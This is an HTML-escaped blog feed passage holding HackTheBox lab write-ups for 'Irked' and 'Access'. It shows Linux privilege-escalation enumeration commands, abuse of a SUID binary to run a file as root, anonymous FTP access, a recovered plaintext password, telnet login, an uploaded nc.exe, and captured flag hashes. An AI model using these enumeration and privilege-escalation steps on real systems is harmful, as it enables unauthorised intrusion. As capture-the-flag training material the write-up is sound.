cat&amp;nbsp;/proc/version;&amp;nbsp;uname&amp;nbsp;-a;&amp;nbsp;uname&amp;nbsp;-mrs;&amp;nbsp;rpm&amp;nbsp;-q&amp;nbsp;kernel;&amp;nbsp;dmesg&amp;nbsp;|&amp;nbsp;grep&amp;nbsp;Linux;&amp;nbsp;ls&amp;nbsp;/boot&amp;nbsp;|&amp;nbsp;grep&amp;nbsp;vmlinuz-;&amp;nbsp;file&amp;nbsp;/bin/ls;&amp;nbsp;cat&amp;nbsp;/etc/lsb-release`&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-33-02.png?fit=680%2C258&quot; alt=&quot;&quot; class=&quot;wp-image-519&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-33-02.png?w=1576 1576w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-33-02.png?resize=300%2C114 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-33-02.png?resize=768%2C292 768w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-33-02.png?resize=1024%2C389 1024w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-33-02.png?w=1360 1360w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; /&gt;&lt;figcaption&gt;Find apps installed;  
+`ls&amp;nbsp;-alh&amp;nbsp;/usr/bin/;&amp;nbsp;ls&amp;nbsp;-alh&amp;nbsp;/sbin/;&amp;nbsp;dpkg&amp;nbsp;-l;&amp;nbsp;rpm&amp;nbsp;-qa;&amp;nbsp;ls&amp;nbsp;-alh&amp;nbsp;/var/cache/apt/archivesO;&amp;nbsp;ls&amp;nbsp;-alh&amp;nbsp;/var/cache/yum/*;`  
+  
+nothing looks out of place here &amp;#8211; checking versions of some apps.&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-35-53.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-522&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-35-53.png?w=586 586w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-35-53.png?resize=300%2C22 300w&quot; sizes=&quot;(max-width: 586px) 100vw, 586px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;`Looking for&amp;nbsp;`writeable config files &amp;#8211; none found  
+ `find&amp;nbsp;/etc/&amp;nbsp;-writable&amp;nbsp;-type&amp;nbsp;f&amp;nbsp;2&amp;gt;/dev/null`&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-41-15.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-523&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-41-15.png?w=581 581w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-41-15.png?resize=242%2C300 242w&quot; sizes=&quot;(max-width: 581px) 100vw, 581px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;What Scheduled jobs? &amp;#8211; None  
+`crontab&amp;nbsp;-l;&amp;nbsp;ls&amp;nbsp;-alh&amp;nbsp;/var/spool/cron;&amp;nbsp;ls&amp;nbsp;-al&amp;nbsp;/etc/&amp;nbsp;|&amp;nbsp;grep&amp;nbsp;cron;&amp;nbsp;ls&amp;nbsp;-al&amp;nbsp;/etc/cron*;&amp;nbsp;cat&amp;nbsp;/etc/cron*;&amp;nbsp;cat&amp;nbsp;/etc/at.allow;&amp;nbsp;cat&amp;nbsp;/etc/at.deny;&amp;nbsp;cat&amp;nbsp;/etc/cron.allow;&amp;nbsp;cat&amp;nbsp;/etc/cron.deny`&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-55-03.png?fit=680%2C60&quot; alt=&quot;&quot; class=&quot;wp-image-530&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-55-03.png?w=1119 1119w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-55-03.png?resize=300%2C27 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-55-03.png?resize=768%2C68 768w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-55-03.png?resize=1024%2C91 1024w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; /&gt;&lt;figcaption&gt;check to see if the system saves any history &amp;#8211; maybe capture a password or username or interesting file in there &amp;#8211; no luck  
+  
+`cat&amp;nbsp;~/.bash_history;&amp;nbsp;cat&amp;nbsp;~/.nano_history;&amp;nbsp;cat&amp;nbsp;~/.atftp_history;&amp;nbsp;cat&amp;nbsp;~/.mysql_history;&amp;nbsp;cat&amp;nbsp;~/.php_history`&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/imageedit_2_2236803244.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-531&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/imageedit_2_2236803244.png?w=1020 1020w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/imageedit_2_2236803244.png?resize=300%2C117 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/imageedit_2_2236803244.png?resize=768%2C300 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;Look for binaries with the SUID or GUID bits set.  
+  
+`find&amp;nbsp;/&amp;nbsp;-perm&amp;nbsp;-g=s&amp;nbsp;-o&amp;nbsp;-perm&amp;nbsp;-4000&amp;nbsp;!&amp;nbsp;-type&amp;nbsp;l&amp;nbsp;-maxdepth&amp;nbsp;6&amp;nbsp;-exec&amp;nbsp;ls&amp;nbsp;-ld&amp;nbsp;{}&amp;nbsp;\;&amp;nbsp;2&amp;gt;/dev/null`&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;What I initially noticed was the date of /usr/bin/viewuser- it was 2018 meaning recently modified. I copied and pasted the other commands in to see what would happen. I also ran the command on my Kali machine&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-10-42-31.png?fit=680%2C328&quot; alt=&quot;&quot; class=&quot;wp-image-534&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-10-42-31.png?w=1061 1061w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-10-42-31.png?resize=300%2C145 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-10-42-31.png?resize=768%2C371 768w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-10-42-31.png?resize=1024%2C494 1024w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; /&gt; &lt;figcaption&gt;I compared it to my Kali machine as it is Debian based. Again viewuser stood out so requires more investigation&amp;nbsp;&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-19-47.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-535&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-19-47.png?w=618 618w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-19-47.png?resize=300%2C55 300w&quot; sizes=&quot;(max-width: 618px) 100vw, 618px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;running the binary says its looking for /tmp/listusers and can&amp;#8217;t find it.&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-21-19.png?fit=680%2C177&quot; alt=&quot;&quot; class=&quot;wp-image-536&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-21-19.png?w=1070 1070w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-21-19.png?resize=300%2C78 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-21-19.png?resize=768%2C200 768w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-21-19.png?resize=1024%2C266 1024w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; /&gt;&lt;figcaption&gt;contents of /tmp&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-22-29.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-537&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-22-29.png?w=706 706w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-22-29.png?resize=300%2C64 300w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;I created listusers with &amp;#8216;echo this is a test&amp;#8217; inside it and ran. Permission denied. Meaning it found the file but obviously doesn&amp;#8217;t have the permission to run it. I need to chmod it.&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-24-22.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-538&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-24-22.png?w=631 631w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-24-22.png?resize=300%2C73 300w&quot; sizes=&quot;(max-width: 631px) 100vw, 631px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;It worked! but what permissions does this file run as. Added whoami to the file&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-25-32.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-539&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-25-32.png?w=635 635w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-25-32.png?resize=300%2C72 300w&quot; sizes=&quot;(max-width: 635px) 100vw, 635px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;Success! It is running as root. Now to capture root.txt&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-26-49.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-540&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-27-00.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-541&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-27-00.png?w=617 617w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-11-27-00.png?resize=300%2C80 300w&quot; sizes=&quot;(max-width: 617px) 100vw, 617px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;root captured&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;You could get that binary to execute a reverse shell with root access.&lt;/p&gt;
+
+&lt;p&gt;I learned some important stuff with this box. Check for sticky bits and look for binaries which are not standard in that version of linux. Also if your not sure what file is doing, add and echo  command to see if it executes it.&lt;/p&gt;</content><author><name>rowbot</name></author><category term="hackthebox" /><category term="irked" /><summary type="html">I learned about SUID with this box. The user access I found easy, I think I got user in under 10 minutes – that’s a first for me. The PE part took me sometime, which a few nudges!</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:4000/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-55-08.png" /></entry><entry><title type="html">Access – HacktheBox</title><link href="http://0.0.0.0:4000/2018/11/22/access-hackthebox/" rel="alternate" type="text/html" title="Access &amp;#8211; HacktheBox" /><published>2018-11-22T15:49:55+00:00</published><updated>2018-11-22T15:49:55+00:00</updated><id>http://0.0.0.0:4000/2018/11/22/access-hackthebox</id><content type="html" xml:base="http://0.0.0.0:4000/2018/11/22/access-hackthebox/">&lt;p&gt;&lt;strong&gt;Skills Required&lt;/strong&gt;&lt;br /&gt;
+Basic knowledge of Linux&lt;br /&gt;
+GoogleFu&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Skills Learned&lt;/strong&gt;&lt;br /&gt;
+Telnet&lt;br /&gt;
+Taking advantage of saved credentials&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;START&lt;br /&gt;&lt;/pre&gt;
+
+&lt;p&gt;nmap -sC -sV -oA all -vv -p- 10.10.10.98&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/ports.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-430&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/ports.png?w=821 821w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/ports.png?resize=300%2C79 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/ports.png?resize=768%2C202 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt; &amp;lt;figcaption&amp;gt;ports after full nmap scan&amp;lt;/figcaption&amp;gt;&amp;lt;/figure&amp;gt; &lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/dc.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-453&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/dc.png?w=670 670w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/dc.png?resize=300%2C208 300w&quot; sizes=&quot;(max-width: 670px) 100vw, 670px&quot; data-recalc-dims=&quot;1&quot; /&gt;&amp;lt;figcaption&amp;gt;only thing on the index page&amp;lt;/figcaption&amp;gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;I did a dirbuster search and nikto but they both revealed nothing of use. I always check these first as they take time to run. So I can get them running and move on. Now to do a nmap FTP scan.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;[&lt;strong&gt;root&lt;/strong&gt;:~/htb/access/writeup]# nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.10.10.98
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-22 14:47 GMT
+NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
+Nmap scan report for 10.10.10.98
+Host is up, received echo-reply ttl 127 (0.036s latency).
+
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 127
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
+
+Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds
+[&lt;strong&gt;root&lt;/strong&gt;:~/htb/access/writeup]# 
+&lt;/pre&gt;
+
+&lt;p&gt;So anonymous FTP login is available! Directory listing is not possible this way for some reason. Lets check for files using FileZilla!&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-432&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?w=549 549w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?resize=150%2C150 150w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?resize=300%2C300 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?resize=500%2C500 500w&quot; sizes=&quot;(max-width: 549px) 100vw, 549px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;figcaption&gt;Pulled backup.mdb and Access Control.zip back to kali  
+  
+&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;2 folders and 2 files found. Inside Engineer file – a zip file called Access Control.zip and inside backup folder – backup.mdb.&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/password-protected.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-436&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/password-protected.png?w=436 436w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/password-protected.png?resize=300%2C143 300w&quot; sizes=&quot;(max-width: 436px) 100vw, 436px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;figcaption&gt;I tried to open Access Control.zip but it was password protected. &lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;I’m gonna assume the password is within the other file somewhere. If stuck not knowing what a file type is I always refer to Google!&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/whatis.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-437&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/whatis.png?w=639 639w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/whatis.png?resize=300%2C146 300w&quot; sizes=&quot;(max-width: 639px) 100vw, 639px&quot; data-recalc-dims=&quot;1&quot; /&gt; &amp;lt;figcaption&amp;gt;what is .mdb file. &amp;lt;/figcaption&amp;gt;&amp;lt;/figure&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;I searched to see if there was an easy way to view the contents of the file and found a useful site – &lt;a href=&quot;https://www.mdbopener.com/&quot;&gt;https://www.mdbopener.com/&lt;/a&gt;&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-439&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png?w=1006 1006w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png?resize=300%2C117 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png?resize=768%2C298 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;/figure&gt;
+
+&lt;p&gt;I found a table called “auth user” – seems interesting. Opened it and there are 3 entries&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/engineer.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-440&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/engineer.png?w=984 984w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/engineer.png?resize=300%2C40 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/engineer.png?resize=768%2C101 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt; &amp;lt;/figure&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;Using the engineer password I extracted the contents of Access Control.zip to give me a .pst file. Back to Google!&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/pstfile.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-441&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/pstfile.png?w=611 611w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/pstfile.png?resize=300%2C179 300w&quot; sizes=&quot;(max-width: 611px) 100vw, 611px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;figcaption&gt;Looks like a file Outlook would use&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;So it looks like a saved email. I don’t want to have to use Outlook to view it so I check Google once again for an easier way. &lt;a href=&quot;https://www.pdfen.com/convert-to-pdf/pst-to-pdf&quot;&gt;https://www.pdfen.com/convert-to-pdf/pst-to-pdf&lt;/a&gt;&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/email.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-444&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/email.png?w=688 688w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/email.png?resize=300%2C101 300w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;/figure&gt;
+
+&lt;p&gt;So there is a user account on this box called ‘security’ with a password ‘4Cc3ssC0ntr0ller’. Okay so how do I login? Lets try FTP. Back to Filezilla!&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;Command:    USER engineer&lt;br /&gt;Response:    331 Password required for engineer.&lt;br /&gt;Command:    PASS **&lt;br /&gt;Response:    530 User cannot log in.&lt;/pre&gt;
+
+&lt;p&gt;Okay that didn’t work so I tried telnet&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/telnet.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-447&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/telnet.png?w=503 503w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/telnet.png?resize=300%2C151 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/telnet.png?resize=500%2C250 500w&quot; sizes=&quot;(max-width: 503px) 100vw, 503px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/addingtelnet-creds.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-449&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/addingtelnet-creds.png?w=692 692w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/addingtelnet-creds.png?resize=300%2C78 300w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;Adding creds to Pentest.ws&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;What type and build of server am I connected to?&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\temp\scripts&amp;gt;systeminfo                                                                                                                                           [102/1437]&lt;br /&gt;Host Name:                 ACCESS         &lt;br /&gt;OS Name:                   Microsoft Windows Server 2008 R2 Standard&lt;br /&gt;OS Version:                6.1.7600 N/A Build 7600&lt;br /&gt;OS Manufacturer:           Microsoft Corporation&lt;br /&gt;OS Configuration:          Standalone Server&lt;br /&gt;OS Build Type:             Multiprocessor Free&lt;br /&gt;Registered Owner:          Windows User   &lt;br /&gt;Registered Organization:                  &lt;br /&gt;Product ID:                55041-507-9857321-84191&lt;br /&gt;Original Install Date:     8/21/2018, 9:43:10 PM&lt;br /&gt;System Boot Time:          11/22/2018, 2:47:46 PM&lt;br /&gt;System Manufacturer:       VMware, Inc.   &lt;br /&gt;System Model:              VMware Virtual Platform&lt;br /&gt;System Type:               x64-based PC   &lt;/pre&gt;
+
+&lt;p&gt;Captured user.txt file&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\Users\security\Desktop&amp;gt;type user.txt&lt;br /&gt;ff1f3b48913b213a31ff6756d2553d38&lt;br /&gt;C:\Users\security\Desktop&amp;gt;&lt;/pre&gt;
+
+&lt;p&gt;So I browsed around uploaded nc.exe but could not executed it. It looks like scripts and executables are blocked.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;This program is blocked by group policy. For more information, contact your system administrator.&lt;/pre&gt;
+
+&lt;p&gt;I started to look for files/folders which are not in the standard Windows install – and found this:&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\ZKTeco&amp;gt;dir&lt;br /&gt; Volume in drive C has no label.&lt;br /&gt; Volume Serial Number is 9C45-DBF0&lt;br /&gt;Directory of C:\ZKTeco&lt;br /&gt;08/22/2018  07:23 AM    &lt;br /&gt;          .&lt;br /&gt;08/22/2018  07:23 AM              ..&lt;br /&gt;08/23/2018  10:56 PM              ZKAccess3.5&lt;br /&gt;               0 File(s)              0 bytes&lt;br /&gt;               3 Dir(s)  16,771,903,488 bytes free&lt;br /&gt;C:\ZKTeco&amp;gt;&lt;/pre&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;[root:~/htb/access]# searchsploit ZKAccess&lt;br /&gt;&lt;br /&gt;Exploit Title                                                                                                                                    &lt;br /&gt;ZKTeco ZKAccess Professional 3.5.3 - Insecure File Permissions Privilege Escalation                                                                        &lt;/pre&gt;
+
+&lt;p&gt;To save you reading about me struggling with this part  – it turned out to be a rabbit hole. I knew it was the wrong version but sometimes the vulnerability might be in the older version as well, so it was worth a shot&lt;/p&gt;
+
+&lt;p&gt;I poked about and found a scripts folder with vbs scripts… interesting – especially the readme_first.txt.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\temp\scripts&amp;gt;dir&lt;br /&gt; Volume in drive C has no label.&lt;br /&gt; Volume Serial Number is 9C45-DBF0&lt;br /&gt;Directory of C:\temp\scripts&lt;br /&gt;08/21/2018  10:25 PM    &lt;br /&gt;          .&lt;br /&gt;08/21/2018  10:25 PM              ..&lt;br /&gt;08/21/2018  10:30 PM               157 1_CREATE_SYSDBA.sql&lt;br /&gt;08/21/2018  10:30 PM                90 2_ALTER_SERVER_ROLE.sql&lt;br /&gt;08/21/2018  10:30 PM               300 3_SP_ATTACH_DB.sql&lt;br /&gt;08/21/2018  10:30 PM               100 4_ALTER_AUTHORIZATION.sql&lt;br /&gt;08/21/2018  10:30 PM             1,802 README_FIRST.txt&lt;br /&gt;03/12/2018  01:37 PM             5,013 RestartServiceByDescriptionNameLike.vbs&lt;br /&gt;03/12/2018  01:37 PM             1,998 SetAccessRuleOnDirectory.vbs&lt;br /&gt;03/12/2018  01:37 PM            26,624 sqlcommand.exe&lt;br /&gt;03/12/2018  01:37 PM             3,855 SQLOpenFirewallPorts.vbs&lt;br /&gt;03/12/2018  01:37 PM             5,277 SQLServerCfgPort.vbs&lt;br /&gt;              10 File(s)         45,216 